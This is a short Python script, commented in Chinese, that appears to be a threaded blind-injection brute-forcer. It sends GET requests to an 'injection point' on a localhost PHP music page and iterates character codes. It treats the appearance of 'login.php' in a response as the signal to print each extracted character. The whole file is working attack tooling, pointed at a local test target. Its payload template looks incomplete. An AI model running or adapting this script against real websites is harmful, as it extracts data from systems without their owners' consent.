import requests
import threading
import warnings
import time
warnings.filterwarnings("ignore")
# result=int(input("输入查找长度"))
result=11
# url = input("输入url及注入点")
url="http://localhost:3000/%E7%BD%91%E9%A1%B5/%E4%B8%BB%E9%A1%B5/%E9%9F%B3%E4%B9%90.php"
# data=input("输入注入语句")
data='?c=11{}{}123'
def fun(url,result,result2):
    for i in range(result2):
        # try:
            reponse=requests.get(url+data.format(result,i),timeout=0.5)
            if 'login.php' in reponse.text:
                time.sleep(1)
                print(result,url+data.format(result,i),chr(i)+"\n")
                break
        # except:
        #     print("error\n")
        #     continue
    return
for  i in range(result):
    t=threading.Thread(target=fun,args=(url,i,150))
    t.start()